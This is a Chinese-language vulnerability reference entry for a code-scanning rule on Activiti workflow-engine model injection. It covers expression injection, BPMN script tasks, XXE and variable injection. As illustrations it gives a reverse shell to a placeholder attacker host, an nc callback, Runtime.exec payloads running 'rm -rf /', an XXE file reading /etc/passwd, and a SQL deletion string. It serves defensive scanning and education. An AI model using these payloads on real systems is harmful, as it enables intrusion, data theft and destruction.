# Java语言Activiti模型注入漏洞

> 规则 ID：`other_activiti_ssti` · 类别：ssti · 关键 sink：RepositoryService, RuntimeService, saveModel, startProcessInstanceByKey
> 说明：本条为语义知识（cypher 语义查询，不可直接挂 semgrep），下方「知识正文」为中文漏洞详解，
> 配合 fortify-kingdom-reference 的定级指南与各语言 sink 手册使用。


## Java语言Activiti模型注入漏洞
Activiti是基于Java的开源工作流引擎，广泛应用于企业级流程自动化场景。**模型注入漏洞**是Activiti生态中一类因流程模型（BPMN/XML）解析、执行环节缺乏严格校验，导致攻击者可通过构造恶意模型数据注入恶意代码/指令，进而实现代码执行、数据泄露、权限篡改等危害的安全漏洞。该漏洞并非单一漏洞类型，而是覆盖模型生命周期（设计、部署、执行、解析）多个环节的一类风险集合，以下从漏洞本质、核心场景、触发条件、危害形式等维度完整拆解。

## 一、漏洞本质
Activiti的核心是将BPMN 2.0（业务流程建模与标注）模型文件（XML格式）解析为可执行的流程实例，其底层依赖Java反射、OGNL/EL表达式引擎、XML解析器、脚本引擎（如Groovy/Javascript）等组件完成模型逻辑的执行。模型注入漏洞的本质是：**Activiti在处理用户可控的模型数据（如BPMN文件、流程变量、表单参数）时，未对输入内容进行严格的语法校验、权限控制和执行环境隔离，导致攻击者构造的恶意输入被引擎解析并执行，突破预期的执行边界**。

## 二、漏洞触发的核心前提
1. 攻击者可控制流程模型的输入：包括上传自定义BPMN文件、修改流程变量、提交表单参数、注入EL/OGNL表达式等；
2. Activiti配置/版本存在缺陷：默认配置未禁用危险脚本引擎、未限制表达式执行权限、XML解析器未防御XXE、反射调用未过滤危险类/方法；
3. 执行环境权限过高：Activiti运行的JVM进程拥有敏感权限（如读写文件、执行系统命令、访问数据库）。

## 三、模型注入漏洞的核心场景及细分情况
### 场景1：表达式注入（EL/OGNL/SpEL）
这是Activiti模型注入最常见的类型，Activiti大量使用表达式引擎解析流程中的动态逻辑（如条件判断、任务分配、变量赋值），若表达式内容可被用户控制，则会触发注入。

#### 1.1 EL表达式注入（Activiti默认表达式引擎）
- **原理**：Activiti使用JUEL（Java Unified Expression Language）作为默认EL引擎，解析`${}`包裹的表达式。若流程模型中的EL表达式内容由用户输入（如流程变量、任务节点条件、表单字段），攻击者可构造恶意EL表达式执行危险操作。
- **触发场景**：
  - 流程设计时，任务节点的“条件表达式”配置为用户可控变量（如`${approved == '${userInput}'}`），攻击者输入`true); java.lang.Runtime.getRuntime().exec("calc"); //` 拼接成恶意表达式；
  - 流程变量赋值时，直接将用户输入作为EL表达式内容（如`runtimeService.setVariable(executionId, "var", userInput)`，且后续流程中以`${var}`解析）；
  - 表单提交的参数被直接嵌入到流程的EL表达式中（如审批表单的“备注”字段被用于`${remark}`判断）。
- **危害形式**：执行系统命令、读写服务器文件、访问数据库、调用Java危险类方法（如`java.io.File`、`java.lang.Runtime`）。

#### 1.2 OGNL表达式注入（Activiti扩展场景）
- **原理**：部分Activiti定制化场景会集成OGNL（Object-Graph Navigation Language）作为表达式引擎，OGNL支持更灵活的Java对象调用，且默认未限制类加载/方法执行，注入风险更高。
- **触发场景**：
  - Activiti流程配置中启用OGNL引擎，且表达式内容（如`#{}`包裹的内容）可被用户控制；
  - 攻击者构造OGNL表达式：`#{@java.lang.Runtime@getRuntime().exec('nc ip 4444')}`，嵌入到流程变量或BPMN文件的节点配置中；
  - 低版本Activiti（如5.x）在解析扩展属性时，未过滤OGNL表达式中的危险调用。
- **特殊风险**：OGNL支持静态方法调用、类实例化，可直接绕过简单的变量校验，实现完整的Java代码执行。

#### 1.3 SpEL表达式注入（集成Spring场景）
- **原理**：Activiti与Spring集成时，部分场景会使用Spring Expression Language（SpEL）解析表达式，SpEL支持`T()`语法调用静态类，注入风险极高。
- **触发场景**：
  - Spring+Activiti环境中，流程变量或BPMN节点配置使用`#{T(java.lang.Runtime).getRuntime().exec('whoami')}`形式的SpEL表达式，且表达式内容可被用户修改；
  - 表单提交的参数被直接传入Spring管理的Activiti bean中，作为SpEL表达式执行。

### 场景2：BPMN模型文件注入
BPMN文件是Activiti流程的核心载体（XML格式），攻击者通过构造恶意BPMN文件上传/部署，触发引擎解析时的注入漏洞。

#### 2.1 脚本任务（Script Task）注入
- **原理**：Activiti的Script Task节点支持执行Groovy、Javascript、Python等脚本语言，若Script Task的脚本内容可被用户控制，攻击者可注入恶意脚本代码。
- **触发场景**：
  - 流程设计平台允许用户自定义Script Task的脚本内容，且未过滤危险操作（如Groovy脚本中执行`Runtime.getRuntime().exec("rm -rf /")`）；
  - 攻击者上传的BPMN文件中，Script Task节点的`<script>`标签内容为恶意Groovy代码：
    ```xml
    <scriptTask id="scriptTask1" scriptFormat="groovy">
      <script>
        def process = Runtime.getRuntime().exec("bash -c 'bash -i >& /dev/tcp/attacker-ip/8080 0>&1'")
      </script>
    </scriptTask>
    ```
  - 低版本Activiti（<5.22）未限制Script Task的脚本引擎类型，且未对脚本内容进行沙箱隔离。

#### 2.2 XML外部实体注入（XXE）
- **原理**：Activiti解析BPMN XML文件时，若使用的XML解析器未禁用外部实体（XXE），攻击者可构造包含外部实体的BPMN文件，读取服务器敏感文件或发起内网请求。
- **触发场景**：
  - Activiti使用默认配置的DOM/SAX解析器解析BPMN文件，未设置`FEATURE_SECURE_PROCESSING`或禁用外部实体；
  - 攻击者构造恶意BPMN文件：
    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE root [
      <!ENTITY xxe SYSTEM "file:///etc/passwd">
    ]>
    <definitions xmlns="http://www.omg.org/spec/BPMN/20100524/MODEL" id="def1" name="def1">
      <process id="process1" isExecutable="true">
        <startEvent id="start1" name="&xxe;"/>
      </process>
    </definitions>
    ```
  - 解析该文件时，引擎会加载外部实体，导致`/etc/passwd`文件内容被读取并嵌入到流程模型中，攻击者可通过查询流程信息获取该内容。

#### 2.3 自定义扩展属性注入
- **原理**：Activiti允许在BPMN文件中定义自定义扩展属性（Extension Elements），若引擎在解析这些属性时，将其作为代码/表达式执行，且未校验内容，则触发注入。
- **触发场景**：
  - 定制化Activiti插件解析BPMN的扩展属性时，将属性值作为EL/OGNL表达式执行；
  - 攻击者在扩展属性中注入恶意表达式：
    ```xml
    <extensionElements>
      <activiti:field name="customField">
        <activiti:expression>${Runtime.getRuntime().exec("ls /")}</activiti:expression>
      </activiti:field>
    </extensionElements>
    ```

### 场景3：流程变量注入
流程变量是Activiti在流程实例执行过程中存储的动态数据，若变量的赋值、读取、解析环节未校验，会触发注入。

#### 3.1 类型混淆注入
- **原理**：Activiti默认支持将流程变量解析为不同类型（如String、Object、Serializable），攻击者通过构造恶意序列化对象或类型转换，触发代码执行。
- **触发场景**：
  - 攻击者将流程变量赋值为恶意的Serializable对象（如包含`Runtime.exec`调用的自定义类实例），Activiti反序列化时执行恶意代码；
  - 变量类型未严格校验，将用户输入的String类型变量强制转换为Expression类型，触发表达式执行。

#### 3.2 批量变量注入
- **原理**：Activiti的`setVariables`方法允许批量设置流程变量，若未对变量名/值进行过滤，攻击者可注入覆盖引擎核心变量的恶意值。
- **触发场景**：
  - 接口允许用户传入`Map<String, Object>`类型的变量集合，攻击者注入名为`executionListener`的变量，值为恶意监听器类，覆盖流程默认监听器；
  - 变量名包含引擎保留关键字（如`_activiti_script`），值为恶意脚本，触发引擎自动执行。

### 场景4：集成场景下的模型注入
Activiti与其他框架集成时，会引入新的注入路径，风险进一步扩大。

#### 4.1 Spring集成注入
- **原理**：Activiti与Spring容器集成时，流程表达式可直接调用Spring Bean的方法，若Bean方法参数可被控制，触发注入。
- **触发场景**：
  - 表达式`#{userService.getUserById('${input}')}`中，`input`被注入为`1'); delete from user; //`，触发SQL注入；
  - 调用Spring Bean的危险方法：`#{systemService.execCommand('rm -rf /')}`，若`execCommand`方法未校验参数，执行系统命令。

#### 4.2 数据库集成注入
- **原理**：Activiti将流程模型数据存储到数据库中，若模型解析时从数据库读取的内容未校验，触发二次注入。
- **触发场景**：
  - 攻击者先通过表单提交恶意EL表达式，存入流程变量表（ACT_RU_VARIABLE）；
  - 引擎后续读取该变量并解析表达式，执行恶意代码；
  - BPMN文件存储到数据库后，读取时未重新校验XML内容，触发XXE或脚本注入。

## 四、漏洞的版本分布特征
- Activiti 5.x系列：漏洞高发，尤其是5.20及以下版本，默认启用危险脚本引擎、未过滤OGNL/EL表达式、XML解析器未防御XXE；
- Activiti 6.x系列：部分修复了Script Task的沙箱隔离，但表达式注入和XXE风险仍存在，未完全禁用危险表达式调用；
- Activiti 7.x系列：引入了更多云原生特性，新增了REST API部署模型的注入路径，虽修复了经典漏洞，但自定义扩展场景仍存在风险；
- 企业版Activiti Cloud：集成了微服务组件，新增了服务间模型传输的注入风险（如跨服务BPMN文件传输未校验）。

## 五、漏洞触发的关键环节总结
Activiti模型注入漏洞可发生在流程模型的全生命周期：
1. **设计阶段**：用户自定义流程节点/表达式时注入恶意内容；
2. **部署阶段**：上传恶意BPMN文件，引擎解析时触发XXE/脚本注入；
3. **执行阶段**：流程变量赋值、任务节点条件判断时触发表达式注入；
4. **解析阶段**：引擎读取数据库/缓存中的模型数据，触发二次注入；
5. **销毁阶段**：流程实例结束时，监听器/清理脚本执行恶意注入代码。

## 六、核心危害
- 远程代码执行（RCE）：最严重危害，攻击者可执行任意系统命令、Java代码，完全控制服务器；
- 敏感数据泄露：通过XXE读取服务器配置文件、数据库凭证，或通过表达式查询流程数据/用户信息；
- 权限提升：注入恶意流程变量修改流程执行人、绕过审批环节，或调用管理员权限的引擎API；
- 数据篡改/破坏：删除流程数据、修改数据库记录、执行恶意脚本删除服务器文件；
- 内网横向移动：通过执行内网命令、发起内网请求，攻击其他业务系统。

综上，Activiti模型注入漏洞的核心风险在于“用户可控输入”与“引擎无校验执行”的叠加，其表现形式随使用场景（表达式类型、BPMN节点类型、集成框架）不同而变化，但本质均是突破了流程引擎的执行边界，将攻击者的恶意逻辑纳入引擎的合法执行流程中。

